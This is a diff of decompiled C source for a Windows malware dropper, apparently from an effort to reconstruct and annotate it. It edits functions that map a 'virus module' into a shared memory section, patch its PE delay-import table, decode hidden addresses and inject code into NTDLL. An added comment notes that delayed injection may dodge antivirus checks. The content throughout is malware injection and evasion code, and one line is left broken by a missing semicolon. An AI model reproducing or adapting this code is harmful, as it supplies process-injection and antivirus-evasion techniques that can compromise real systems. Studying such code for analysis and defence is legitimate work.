@@ -23,38 +23,43 @@ INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVO
 	HANDLE hMapHandle; // [sp+4h] [bp-28h]@1
 	PVOID pVirusImageBase; // [sp+8h] [bp-24h]@3
 	PIMAGE_NT_HEADERS pImageNT; // [sp+Ch] [bp-20h]@6
-	INT32 iSectionPointer; // [sp+10h] [bp-1Ch]@1
-	PVOID pBaseAddr1; // [sp+14h] [bp-18h]@1
 	PIMAGE_DOS_HEADER pImageDOS; // [sp+18h] [bp-14h]@3
-	UINT32 iSectionsSize; // [sp+1Ch] [bp-10h]@1
-	PVOID pBaseAddr2; // [sp+20h] [bp-Ch]@1
 	PVIRUS_MODULE_BLOCKS_HEADER sVirusModuleBlocksHeader; // [sp+24h] [bp-8h]@3
-	INT32 iOpenMapViewFailed; // [sp+28h] [bp-4h]@1
 
-	pBaseAddr1      = 0;
-	pBaseAddr2      = 0;
+	PVOID pCurrAddr = 0;
+	PVOID pBaseAddr = 0;
 
-	iSectionPointer = 0;
-	iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;
+	INT32 iSectionPointer  = 0;
+	UINT32 iSectionsSize   = sizeof(VIRUS_MODULE_BLOCKS_HEADER) + pUnknownSegmentSize + pVirusModuleSize;
 
-	iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pBaseAddr1, &pBaseAddr2);
-	if(iOpenMapViewFailed) return iOpenMapViewFailed;
+	INT32 iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &hMapHandle, &pCurrAddr, &pBaseAddr);
+	if(iOpenMapViewFailed)
+		return iOpenMapViewFailed;
 
-	sVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pBaseAddr1;
-	pBaseAddr1               = (PVOID)((DWORD)pBaseAddr1 + sizeof(VIRUS_MODULE_BLOCKS_HEADER));
+	sVirusModuleBlocksHeader = (PVIRUS_MODULE_BLOCKS_HEADER)pBaseAddr;
+	pCurrAddr                = (PVOID)((DWORD)pCurrAddr + sizeof(VIRUS_MODULE_BLOCKS_HEADER));
+
+	// Don't overwrite the header
 	iSectionPointer          = sizeof(VIRUS_MODULE_BLOCKS_HEADER);
 
-	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);
-	pVirusImageBase = pBaseAddr1;
+	CopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer, &sVirusModuleBlocksHeader->UnknownSegment, pUnknownSegment, pUnknownSegmentSize);
+	pVirusImageBase = pCurrAddr;
 
-	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);
+	CopySegmentIntoSections(&pCurrAddr, pBaseAddr, &iSectionPointer, &sVirusModuleBlocksHeader->VirusModuleSegment, pVirusModule, pVirusModuleSize);
 	pImageDOS = (PIMAGE_DOS_HEADER)pVirusImageBase;
 
+	// if virusmodule has "MZ" magic for .exe and virus is within size bounds
 	if((UINT32)pVirusModuleSize >= 0x1000 &&
 	   pImageDOS->e_magic == MZ_HEADER &&
 	   pImageDOS->e_lfanew + sizeof(IMAGE_OPTIONAL_HEADER) + sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD) < (UINT32)pVirusModuleSize) // (UINT32 *)pImageDOS[15] + 248 -> Section ".text"
 	{
 		pImageNT = (PIMAGE_NT_HEADERS)((DWORD)pVirusImageBase + pImageDOS->e_lfanew);
+
+		// According to the below references, each entry in the delay import table is 32 bits
+		//  so what the actual fuck is going on here. I suppose delayed injection would be a good way
+		//  of dodging an AV's runtime check, as the virus is loaded into memory as-needed
+		// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680305(v=vs.85).aspx
+		// http://svn.wildfiregames.com/docs/structImgDelayDescr.html
 		if(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)
 			pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size = 64; // Change Delay Import Directory Size
 	}
@@ -64,9 +69,9 @@ INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVO
 	sVirusModuleBlocksHeader->LibraryExecuteEntryNumber = iExecEntryNumber;
 	sVirusModuleBlocksHeader->VirusModulePointer        = 0;
 
-	*pOutSection = pBaseAddr2;
+	*pOutSection = pBaseAddr;
 
-	g_hardAddrs.UnmapViewOfFile(sVirusModuleBlocksHeader); // Unmap pBaseAddr1 -> same copy present in pBaseAddr2
+	g_hardAddrs.UnmapViewOfFile(sVirusModuleBlocksHeader); // Unmap pCurrAddr -> same copy present in pBaseAddr
 	g_hardAddrs.ZwClose(hMapHandle);
 
 	return 0;
@@ -79,18 +84,19 @@ INT32 LoadAndInjectVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader, PVIRUS_MO
 	HANDLE hMappedAddress; // [sp+4h] [bp-8Ch]@7
 	INT32 iResult; // [sp+8h] [bp-88h]@1
 	PHARDCODED_ADDRESSES pHardAddrs; // [sp+Ch] [bp-84h]@1
-	GENERAL_INFO_BLOCK sInfoBlockCopy; // [sp+10h] [bp-80h]@1
 
+	GENERAL_INFO_BLOCK sInfoBlockCopy;
 	__memcpy(&sInfoBlockCopy, sInfoBlock, sizeof(GENERAL_INFO_BLOCK)); // Copy the information
 
 	sInfoBlockCopy.OriginalAddress ^= XADDR_KEY; // Get the original address of the variable sInfoBlock
 	sInfoBlockCopy.UnknownZero0     = 0;
 
-	// Point to the first block of assembly in the section
+	// Point to g_hardAddrs in memory
 	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
 
 	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)sVirusModuleBlocksHeader->VirusModuleSegment.SegmentAddress, sVirusModuleBlocksHeader->VirusModuleSegment.SegmentSize);
-	if(iResult) return iResult
+	if(iResult)
+		return iResult
 
 	if(BLOCK4_InjectCodeIntoNTDLL(sASMCodeBlocksHeader, pHardAddrs))
 		return -4;
@@ -205,9 +211,11 @@ INT32 Setup(LPCWSTR szDebugModuleName, PVOID pVirusModule, UINT32 iVirusModuleSi
 	// Decrypt the Kernel32's and NTDLL's function names
 	if(bSetup && DecodeEncryptedModuleNames() == FALSE) return -12;
 
+	// Last 4 arguments seem to have been mangled, as -1 is a nonsensical index.
 	iResult = LoadVirusModuleSection(GetCurrentProcess(), &sInfoBlock, pVirusModule, iVirusModuleSize, -1, NULL, 0, &s_virusBlocksPTR);
 	if(iResult) return iResult;
 
+	// One-time
 	if(bSetup)
 	{
 		iResult = LoadCodeSection(GetCurrentProcess(), s_virusBlocksPTR, &s_codeBlockPTR, &s_ASMCodeBlocksPTR);
